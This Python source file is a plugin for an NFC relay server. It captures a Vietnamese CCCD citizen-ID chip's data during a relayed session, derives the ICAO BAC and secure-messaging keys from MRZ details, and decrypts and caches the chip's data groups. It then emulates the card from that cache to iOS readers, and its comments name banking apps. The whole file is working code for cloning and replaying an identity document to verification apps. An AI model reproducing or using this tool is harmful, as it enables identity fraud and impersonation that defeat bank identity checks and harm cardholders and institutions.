"""
mod_cccd_cache.py - NFCGate relay plugin for Vietnamese CCCD server-side emulation.

Configure via cccd_config.json in the server root directory:
{
    "mode": "train",
    "doc_number": "123456789",
    "dob": "850101",
    "expiry": "300101"
}

Modes:
  train  - Forward all APDUs normally; intercept BAC exchange to derive session
           keys, then decrypt and store DG plaintext to cccd_cache.json.
  serve  - Respond to all ICAO MRTD commands from cache; Samsung chip is not
           contacted. Each iOS session gets fresh BAC nonces and SM session keys.

Run as: python server.py cccd_cache [log]

Requires pycryptodome: pip install pycryptodome
"""

import hashlib
import json
import os

from Crypto.Cipher import DES, DES3

from plugins.c2c_pb2 import NFCData
from plugins.c2s_pb2 import ServerData
from server_state import state as _dstate, _FID_NAME

# ─── Config / Cache files (relative to server.py) ────────────────────────────

_SERVER_DIR = os.path.join(os.path.dirname(__file__), '..')
CONFIG_FILE = os.path.join(_SERVER_DIR, 'cccd_config.json')
CACHE_FILE  = os.path.join(_SERVER_DIR, 'cccd_cache.json')

def _load_config():
    cfg = {}
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            cfg = json.load(f)
    return cfg

def _load_cache():
    if os.path.exists(CACHE_FILE):
        with open(CACHE_FILE) as f:
            raw = json.load(f)
        return {k: bytes.fromhex(v) for k, v in raw.items()}
    return {}

_cfg   = _load_config()
_cache = _load_cache()

MODE       = _cfg.get('mode', 'train')
DOC_NUMBER = _cfg.get('doc_number', '')
DOB        = _cfg.get('dob', '')
EXPIRY     = _cfg.get('expiry', '')


# ─── ICAO 9303 Key Derivation ────────────────────────────────────────────────

def _mrz_check_digit(s):
    weights = [7, 3, 1]
    total = 0
    for i, c in enumerate(s):
        if c.isdigit():   v = int(c)
        elif c.isalpha(): v = ord(c.upper()) - 55
        else:             v = 0
        total += v * weights[i % 3]
    return str(total % 10)

def _pad_doc_number(n):
    return (n + '<' * 9)[:9]

def _adjust_parity(b):
    out = bytearray(b)
    for i in range(len(out)):
        if bin(out[i]).count('1') % 2 == 0:
            out[i] ^= 1
    return bytes(out)

def _derive_key(seed16, counter):
    c = counter.to_bytes(4, 'big')
    raw = hashlib.sha1(seed16 + c).digest()[:16]
    return _adjust_parity(raw)

def _bac_keys(doc_number, dob, expiry):
    d  = _pad_doc_number(doc_number)
    cd = _mrz_check_digit(d)
    mrz_info = d + cd + dob + _mrz_check_digit(dob) + expiry + _mrz_check_digit(expiry)
    seed = hashlib.sha1(mrz_info.encode('ascii')).digest()[:16]
    return _derive_key(seed, 1), _derive_key(seed, 2)


# ─── Cryptographic Primitives ────────────────────────────────────────────────

def _3des_ecb(key, block, encrypt=True):
    c = DES3.new(key, DES3.MODE_ECB)
    return c.encrypt(block) if encrypt else c.decrypt(block)

def _3des_cbc(key, iv, data, encrypt=True):
    c = DES3.new(key, DES3.MODE_CBC, iv)
    return c.encrypt(data) if encrypt else c.decrypt(data)

def _pad80(data):
    p = data + b'\x80'
    p += b'\x00' * ((-len(p)) % 8)
    return p

def _unpad80(data):
    i = len(data) - 1
    while i >= 0 and data[i] == 0x00:
        i -= 1
    return data[:i] if i >= 0 and data[i] == 0x80 else data

def _retail_mac_raw(key, padded_msg):
    """ISO 9797-1 MAC Alg 3 — input MUST already be padded to 8-byte boundary."""
    k1, k2 = key[:8], key[8:16]
    state = b'\x00' * 8
    for i in range(0, len(padded_msg), 8):
        block = bytes(a ^ b for a, b in zip(state, padded_msg[i:i+8]))
        state = DES.new(k1, DES.MODE_ECB).encrypt(block)
    state = DES.new(k2, DES.MODE_ECB).decrypt(state)
    return DES.new(k1, DES.MODE_ECB).encrypt(state)

def _retail_mac(key, data):
    """MAC with automatic ISO 7816-4 padding."""
    return _retail_mac_raw(key, _pad80(data))

def _encode_len(n):
    if n < 0x80:   return bytes([n])
    if n < 0x100:  return bytes([0x81, n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])

def _parse_tlv(data):
    result, i = {}, 0
    while i < len(data):
        tag = data[i]; i += 1
        if i >= len(data): break
        ln = data[i]; i += 1
        if ln == 0x81:   ln = data[i]; i += 1
        elif ln == 0x82: ln = (data[i] << 8) | data[i+1]; i += 2
        result[tag] = data[i:i+ln]; i += ln
    return result

def _inc_ssc(ssc):
    n = int.from_bytes(ssc, 'big') + 1
    return n.to_bytes(8, 'big')


# ─── Secure Messaging ────────────────────────────────────────────────────────

def _sm_enc(ksenc, ssc, plaintext):
    """Encrypt plaintext → DO'87' content (0x01 prefix + ciphertext)."""
    iv = _3des_ecb(ksenc, ssc)
    ct = _3des_cbc(ksenc, iv, _pad80(plaintext))
    return b'\x01' + ct

def _sm_dec(ksenc, ssc, do87):
    """Decrypt DO'87' content (strips 0x01 prefix)."""
    if not do87 or do87[0] != 0x01:
        raise ValueError("DO'87' missing 0x01 padding indicator")
    iv = _3des_ecb(ksenc, ssc)
    return _unpad80(_3des_cbc(ksenc, iv, do87[1:], encrypt=False))

def _sm_mac_cmd(ksmac, ssc, header, do87=None, do97=None):
    """Build MAC input for SM command: SSC || pad(header) [|| pad(DO87 TLV)] [|| pad(DO97 TLV)]."""
    m = ssc + _pad80(header)
    if do87 is not None:
        tlv = b'\x87' + _encode_len(len(do87)) + do87
        m += _pad80(tlv)
    if do97 is not None:
        tlv = b'\x97' + _encode_len(len(do97)) + do97
        m += _pad80(tlv)
    return _retail_mac_raw(ksmac, m)

def _sm_mac_resp(ksmac, ssc, do87=None, do99=None):
    """Build MAC input for SM response: SSC [|| pad(DO87 TLV)] || pad(DO99 TLV)."""
    m = ssc
    if do87 is not None:
        tlv = b'\x87' + _encode_len(len(do87)) + do87
        m += _pad80(tlv)
    if do99 is not None:
        tlv = b'\x99' + _encode_len(len(do99)) + do99
        m += _pad80(tlv)
    return _retail_mac_raw(ksmac, m)

def _unwrap_cmd(ksenc, ksmac, ssc, apdu):
    """
    Unwrap SM command.  Increments ssc.
    Returns (new_ssc, plaintext_data, le) or raises on MAC error.
    """
    ssc  = _inc_ssc(ssc)
    hdr  = apdu[:4]
    lc   = apdu[4] if len(apdu) > 4 else 0
    body = apdu[5:5+lc]
    tlv  = _parse_tlv(body)

    do87 = tlv.get(0x87)
    do97 = tlv.get(0x97)
    do8e = tlv.get(0x8E)

    if do8e is None:
        raise ValueError("Missing DO'8E'")
    mac = _sm_mac_cmd(ksmac, ssc, hdr, do87, do97)
    if mac != do8e:
        raise ValueError(f"CMD MAC mismatch: got {mac.hex()} expected {do8e.hex()}")

    plaintext = _sm_dec(ksenc, ssc, do87) if do87 else b''
    le = int.from_bytes(do97, 'big') if do97 else None
    return ssc, plaintext, le

def _wrap_resp(ksenc, ksmac, ssc, data, sw1, sw2):
    """
    Wrap a plain response in SM.  Increments ssc.
    Returns (ssc, full_response_bytes_including_plain_SW).
    """
    ssc   = _inc_ssc(ssc)
    do87  = _sm_enc(ksenc, ssc, data) if data else None
    do99  = bytes([sw1, sw2])
    mac   = _sm_mac_resp(ksmac, ssc, do87, do99)

    resp = b''
    if do87 is not None:
        resp += b'\x87' + _encode_len(len(do87)) + do87
    resp += b'\x99' + _encode_len(len(do99)) + do99
    resp += b'\x8E' + _encode_len(len(mac))   + mac
    return ssc, resp + bytes([sw1, sw2])


# ─── BAC Emulation ───────────────────────────────────────────────────────────

def _process_ext_auth(kenc, kmac, chip_nonce, cmd_data):
    """
    Validate EXTERNAL AUTHENTICATE, derive session keys.
    cmd_data: 40 bytes = EIFD(32) + MIFD(8).
    Returns (response_40_bytes, ksenc, ksmac, ssc) or None on failure.
    """
    if len(cmd_data) != 40:
        return None
    eifd, mifd = cmd_data[:32], cmd_data[32:]

    if _retail_mac(kmac, eifd) != mifd:
        return None

    s = _3des_cbc(kenc, b'\x00' * 8, eifd, encrypt=False)
    rnd_ifd, rnd_ic_received, k_ifd = s[:8], s[8:16], s[16:32]
    if rnd_ic_received != chip_nonce:
        return None

    k_ic = os.urandom(16)
    s_prime = chip_nonce + rnd_ifd + k_ic
    eic = _3des_cbc(kenc, b'\x00' * 8, s_prime)
    mic = _retail_mac(kmac, eic)

    ks_seed = bytes(a ^ b for a, b in zip(k_ifd, k_ic))
    ksenc = _derive_key(ks_seed, 1)
    ksmac = _derive_key(ks_seed, 2)
    ssc   = chip_nonce[4:] + rnd_ifd[4:]

    return eic + mic, ksenc, ksmac, ssc


# ─── Per-Session State ────────────────────────────────────────────────────────

_sessions = {}

def _sess(session_id):
    if session_id not in _sessions:
        _sessions[session_id] = {
            'phase':       'pre_bac',
            'chip_nonce':  None,
            'kenc':        None, 'kmac':  None,
            'ksenc':       None, 'ksmac': None,
            'ssc':         None,
            'sel_fid':     None,
            # training accumulators
            'tr_kenc': None, 'tr_ksmac': None, 'tr_ssc': None,
            'tr_rnd_ifd': None, 'tr_k_ifd': None,
            'tr_sel_fid': None,
            'tr_ro':    0,         # read offset
            'tr_data':  {},        # fid_str → {offset: bytes}
            'tr_rewrap_pending': False,   # True while waiting for SM response to plain SELECT
        }
    return _sessions[session_id]


# ─── Wire helpers ─────────────────────────────────────────────────────────────

def _make_push(data_source, apdu_bytes):
    nfc = NFCData()
    nfc.data_source = data_source
    nfc.data_type   = NFCData.CONTINUATION
    nfc.data        = apdu_bytes
    srv = ServerData()
    srv.opcode = ServerData.OP_PSH
    srv.data   = nfc.SerializeToString()
    return srv.SerializeToString()

def _send(client, data_source, apdu_bytes):
    msg = _make_push(data_source, apdu_bytes)
    client.wfile.write(len(msg).to_bytes(4, 'big'))
    client.wfile.write(msg)


# ─── Training mode ────────────────────────────────────────────────────────────

def _train(log, data, st, apdu, is_card):
    if not is_card:
        # Chip response
        if st.get('tr_rewrap_pending'):
            st['tr_rewrap_pending'] = False
            try:
                ssc = _inc_ssc(st['tr_ssc'])
                st['tr_ssc'] = ssc
                tlv = _parse_tlv(apdu[:-2])
                do99 = tlv.get(0x99)
                sw = bytes(do99[-2:]) if do99 and len(do99) >= 2 else bytes(apdu[-2:])
                log('CCCD-T', f"rewrap: SM resp → plain SW={sw.hex()}")
                return _make_push(NFCData.READER, sw)
            except Exception as e:
                log('CCCD-T', f"rewrap unwrap err: {e}")
                return _make_push(NFCData.READER, bytes(apdu[-2:]))

        phase = st['phase']
        if phase == 'await_nonce' and len(apdu) == 10 and apdu[8:] == b'\x90\x00':
            st['chip_nonce'] = apdu[:8]
            st['phase'] = 'await_ext_auth'
            log('CCCD-T', f"chip_nonce={apdu[:8].hex()}")

        elif phase == 'await_ext_auth' and len(apdu) >= 42 and apdu[-2:] == b'\x90\x00':
            eic = apdu[:32]
            kenc, _ = _bac_keys(DOC_NUMBER, DOB, EXPIRY)
            try:
                s_prime = _3des_cbc(kenc, b'\x00' * 8, eic, encrypt=False)
                k_ic    = s_prime[16:32]
                k_ifd   = st['tr_k_ifd']
                if k_ifd:
                    ks_seed = bytes(a ^ b for a, b in zip(k_ifd, k_ic))
                    ksenc = _derive_key(ks_seed, 1)
                    ksmac = _derive_key(ks_seed, 2)
                    ssc   = st['chip_nonce'][4:] + st['tr_rnd_ifd'][4:]
                    st.update({'tr_kenc': ksenc, 'tr_ksmac': ksmac,
                               'tr_ssc': ssc, 'phase': 'sm'})
                    log('CCCD-T', f"SM keys derived  KSenc={ksenc.hex()}")
            except Exception as e:
                log('CCCD-T', f"BAC resp parse error: {e}")

        elif phase == 'sm' and st['tr_kenc']:
            # Chip SM response — increment SSC then decrypt
            try:
                ssc = _inc_ssc(st['tr_ssc'])
                st['tr_ssc'] = ssc
                tlv = _parse_tlv(apdu[:-2])   # strip trailing plain SW
                do87 = tlv.get(0x87)
                if do87:
                    pt = _sm_dec(st['tr_kenc'], ssc, do87)
                    fid = st['tr_sel_fid'] or 'UNKNOWN'
                    off = st['tr_ro']
                    log('CCCD-T', f"DG fid={fid} off={off} len={len(pt)} {pt[:16].hex()}...")
                    st['tr_data'].setdefault(fid, {})[off] = pt
                    _save_cache(st, log)
            except Exception as e:
                log('CCCD-T', f"SM resp decrypt err: {e}")
        return data

    # Card side (command from iOS)
    cla, ins = apdu[0], apdu[1]

    if cla == 0x00 and ins == 0x84:                        # GET CHALLENGE
        st['phase'] = 'await_nonce'

    elif cla == 0x00 and ins == 0x82:                      # EXTERNAL AUTHENTICATE
        kenc, kmac = _bac_keys(DOC_NUMBER, DOB, EXPIRY)
        if len(apdu) >= 45:
            try:
                s = _3des_cbc(kenc, b'\x00' * 8, apdu[5:37], encrypt=False)
                st['tr_rnd_ifd'] = s[:8]
                st['tr_k_ifd']   = s[16:32]
            except Exception as e:
                log('CCCD-T', f"EXT AUTH parse err: {e}")

    elif cla == 0x00 and ins == 0xA4:                      # plain SELECT FILE / AID
        p1_b = apdu[2] if len(apdu) > 2 else 0
        p2_b = apdu[3] if len(apdu) > 3 else 0
        lc   = apdu[4] if len(apdu) > 4 else 0
        aid  = apdu[5:5+lc]
        CCCD_AID = bytes.fromhex('A0000002471001')
        if p1_b == 0x04 and aid == CCCD_AID:
            # Application (re)selection — clear stale SM state so next VCB/MB session starts clean
            st.update({'tr_kenc': None, 'tr_ksmac': None, 'tr_ssc': None,
                       'phase': 'pre_bac', 'tr_rnd_ifd': None, 'tr_k_ifd': None,
                       'tr_rewrap_pending': False})
            st['tr_sel_fid'] = None
            log('CCCD-T', 'SELECT CCCD AID → SM state cleared')
        elif p1_b == 0x04 and st.get('tr_kenc') and st.get('tr_ssc'):
            # Banking app plain SELECT to non-CCCD AID while SM session is active.
            # Chip is in SM mode and will reject CLA=00 — re-wrap as SM SELECT.
            try:
                ssc = _inc_ssc(st['tr_ssc'])
                st['tr_ssc'] = ssc
                header = bytes([0x0C, 0xA4, p1_b, p2_b])
                do87 = _sm_enc(st['tr_kenc'], ssc, aid)
                do8e = _sm_mac_cmd(st['tr_ksmac'], ssc, header, do87, None)
                body = b'\x87' + _encode_len(len(do87)) + do87 + b'\x8E\x08' + do8e
                sm_apdu = header + bytes([len(body)]) + body + b'\x00'
                st['tr_rewrap_pending'] = True
                log('CCCD-T', f"rewrap: plain SELECT AID {aid.hex()} → SM SELECT")
                return _make_push(NFCData.CARD, sm_apdu)
            except Exception as e:
                log('CCCD-T', f"rewrap SM SELECT err: {e}")
        else:
            st['tr_sel_fid'] = aid.hex().upper() if lc >= 2 else None

    elif cla == 0x0C:
        ksenc, ksmac, ssc = st['tr_kenc'], st['tr_ksmac'], st['tr_ssc']
        if ksenc and ssc:
            try:
                ssc = _inc_ssc(ssc)
                st['tr_ssc'] = ssc
                tlv  = _parse_tlv(apdu[5:5 + (apdu[4] if len(apdu) > 4 else 0)])
                do87 = tlv.get(0x87)
                if ins == 0xA4 and do87:                   # SM SELECT FILE
                    pt = _sm_dec(ksenc, ssc, do87)
                    st['tr_sel_fid'] = pt[:2].hex().upper() if len(pt) >= 2 else None
                elif ins == 0xB0:                          # SM READ BINARY
                    st['tr_ro'] = ((apdu[2] & 0x7F) << 8) | apdu[3]
            except Exception as e:
                log('CCCD-T', f"SM cmd parse err: {e}")
    return data

def _save_cache(st, log):
    global _cache
    out = {}
    for fid, chunks in st['tr_data'].items():
        assembled = b''.join(v for _, v in sorted(chunks.items()))
        if assembled:
            out[fid] = assembled.hex()
    try:
        with open(CACHE_FILE, 'w') as f:
            json.dump(out, f, indent=2)
        _cache = {k: bytes.fromhex(v) for k, v in out.items()}
        named = [_FID_NAME.get(k, k) for k in out.keys()]
        log('CCCD-T', f"cache saved ({len(out)} files: {named})")
        _dstate.mark_files_cached(named)
    except Exception as e:
        log('CCCD-T', f"cache save failed: {e}")


# ─── Serve mode ──────────────────────────────────────────────────────────────

def _serve(log, data, st, apdu, is_card, client):
    if not is_card:
        return None      # suppress any Samsung output

    if len(apdu) < 4 or client is None:
        return None

    cla, ins, p1, p2 = apdu[0], apdu[1], apdu[2], apdu[3]

    # ── Non-SM APDUs ─────────────────────────────────────────────────────
    if cla == 0x00:
        if ins == 0xA4 and p1 == 0x04:                    # SELECT APP by AID
            kenc, kmac = _bac_keys(DOC_NUMBER, DOB, EXPIRY)
            st.update({'kenc': kenc, 'kmac': kmac, 'phase': 'pre_bac'})
            log('CCCD-S', 'SELECT APP → 9000')
            _send(client, NFCData.READER, b'\x90\x00')
            return None

        if ins == 0x84:                                    # GET CHALLENGE
            nonce = os.urandom(8)
            st['chip_nonce'] = nonce
            st['phase'] = 'await_ext_auth'
            log('CCCD-S', f'GET CHALLENGE → {nonce.hex()}')
            _send(client, NFCData.READER, nonce + b'\x90\x00')
            return None

        if ins == 0x82:                                    # EXTERNAL AUTHENTICATE
            if st.get('phase') != 'await_ext_auth' or not st.get('kenc'):
                log('CCCD-S', 'EXT AUTH in wrong phase')
                _send(client, NFCData.READER, b'\x69\x85')
                return None
            lc       = apdu[4] if len(apdu) > 4 else 0
            cmd_data = apdu[5:5+lc]
            result   = _process_ext_auth(st['kenc'], st['kmac'], st['chip_nonce'], cmd_data)
            if result is None:
                log('CCCD-S', 'EXT AUTH FAILED')
                _send(client, NFCData.READER, b'\x63\x00')
                return None
            resp40, ksenc, ksmac, ssc = result
            st.update({'ksenc': ksenc, 'ksmac': ksmac, 'ssc': ssc,
                       'phase': 'sm', 'sel_fid': None})
            log('CCCD-S', f'BAC OK  KSenc={ksenc.hex()}  SSC={ssc.hex()}')
            _send(client, NFCData.READER, resp40 + b'\x90\x00')
            return None

        if ins == 0xA4:                                    # plain SELECT FILE
            lc = apdu[4] if len(apdu) > 4 else 0
            fid = apdu[5:5+lc].hex().upper() if lc >= 2 else None
            st['sel_fid'] = fid
            _send(client, NFCData.READER, b'\x90\x00')
            return None

        if ins == 0xB0:                                    # plain READ BINARY
            off = ((p1 & 0x7F) << 8) | p2
            le  = apdu[4] if len(apdu) > 4 else 0xEF
            fid = st.get('sel_fid')
            chunk = _cache.get(fid, b'')[off:off+le] if fid else b''
            _send(client, NFCData.READER, chunk + b'\x90\x00')
            return None

        # Unknown non-SM — return 6D00 (INS not supported)
        _send(client, NFCData.READER, b'\x6D\x00')
        return None

    # ── SM APDUs (CLA = 0x0C) ────────────────────────────────────────────
    if cla == 0x0C:
        if st.get('phase') != 'sm' or not st.get('ksenc'):
            log('CCCD-S', 'SM cmd before BAC')
            _send(client, NFCData.READER, b'\x69\x88')
            return None
        try:
            ssc, pt, le = _unwrap_cmd(st['ksenc'], st['ksmac'], st['ssc'], apdu)
            st['ssc'] = ssc
        except Exception as e:
            log('CCCD-S', f'SM unwrap failed: {e}')
            _send(client, NFCData.READER, b'\x69\x88')
            return None

        if ins == 0xA4:                                    # SM SELECT FILE
            fid = pt[:2].hex().upper() if len(pt) >= 2 else None
            st['sel_fid'] = fid
            log('CCCD-S', f'SM SELECT {fid}')
            ssc, resp = _wrap_resp(st['ksenc'], st['ksmac'], st['ssc'], b'', 0x90, 0x00)
            st['ssc'] = ssc
            _send(client, NFCData.READER, resp)
            return None

        if ins == 0xB0:                                    # SM READ BINARY
            off  = ((p1 & 0x7F) << 8) | p2
            rlen = le if le is not None else 0xEF
            fid  = st.get('sel_fid')
            log('CCCD-S', f'SM READ fid={fid} off={off} len={rlen}')
            if fid and fid in _cache:
                chunk = _cache[fid][off:off+rlen]
                sw1, sw2 = (0x90, 0x00) if chunk or off < len(_cache[fid]) else (0x6B, 0x00)
            else:
                chunk, sw1, sw2 = b'', 0x6A, 0x82
                log('CCCD-S', f'FID {fid} not in cache ({list(_cache.keys())})')
            ssc, resp = _wrap_resp(st['ksenc'], st['ksmac'], st['ssc'], chunk, sw1, sw2)
            st['ssc'] = ssc
            _send(client, NFCData.READER, resp)
            return None

        # Unknown SM INS — return SM-wrapped 6D00
        log('CCCD-S', f'Unknown SM INS {ins:02X}')
        ssc, resp = _wrap_resp(st['ksenc'], st['ksmac'], st['ssc'], b'', 0x6D, 0x00)
        st['ssc'] = ssc
        _send(client, NFCData.READER, resp)
        return None

    return data   # other CLA — pass through


# ─── Plugin entry point ───────────────────────────────────────────────────────

def handle_data(log, data, state, client=None):
    srv = ServerData()
    srv.ParseFromString(data)

    if srv.opcode != ServerData.OP_PSH:
        # SYN / ACK / FIN — always pass through; clear session state on FIN
        if srv.opcode == ServerData.OP_FIN:
            sid = getattr(client, 'session', None)
            _sessions.pop(sid, None)
        return data

    nfc = NFCData()
    nfc.ParseFromString(srv.data)
    apdu    = bytes(nfc.data)
    is_card = (nfc.data_source == NFCData.CARD)
    sid     = getattr(client, 'session', None)
    st      = _sess(sid)

    if MODE == 'train':
        return _train(log, data, st, apdu, is_card)
    elif MODE == 'serve':
        return _serve(log, data, st, apdu, is_card, client)
    return data
